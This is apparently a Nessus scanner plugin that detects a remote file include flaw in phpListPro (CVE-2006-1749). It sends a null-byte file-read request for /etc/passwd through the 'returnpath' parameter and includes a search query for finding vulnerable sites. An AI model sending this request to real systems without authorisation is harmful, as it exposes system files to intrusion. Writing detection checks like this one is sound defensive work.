#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
remote file include vulnerabilities. 

Description :

The remote host is running phpListPro, a web site voting/ranking tool
written in PHP. 

The installed version of phpListPro fails to sanitize user input to
the 'returnpath' parameter of the 'config.php', 'editsite.php',
'addsite.php', and 'in.php' scripts before using it to include PHP
code from other files.  An unauthenticated attacker may be able to
read arbitrary local files or include a file from a remote host that
contains commands which will be executed on the remote host subject to
the privileges of the web server process. 

These flaws are only exploitable if PHP's 'register_globals' is
enabled. 

See also : 

http://archives.neohapsis.com/archives/bugtraq/2006-04/0206.html
http://archives.neohapsis.com/archives/bugtraq/2006-05/0153.html
http://archives.neohapsis.com/archives/bugtraq/2006-05/0199.html
http://www.smartisoft.com/forum/viewtopic.php?t=3019

Solution : 

Edit the affected files as discussed in the vendor advisory above.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(21310);
  script_version("$Revision: 1.3 $");
  script_bugtraq_id(17448);
  script_cve_id("CVE-2006-1749");
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"24540");

  name["english"] = "phpListPro returnpath Remote File Include Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for file includes in phpListPro's config.php";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Josh Zlatin-Amishav");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
#
# Google for '"PHPListPro Ver"|intitle:"rated TopList"'.
if (thorough_tests) dirs = make_list("/phplistpro", "/toplist", "/topsite", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw in config.php to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/config.php?",
      "returnpath=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "Failed opening".
      egrep(string:res, pattern:"Failed opening required '/etc/passwd\\0lang_.+")
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) content = res;

    if (content)
      report = string(
        desc["english"],
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the repeated contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        content
      );
    else report = desc["english"];

    security_warning(port:port, data:report);
    exit(0);
  }
}
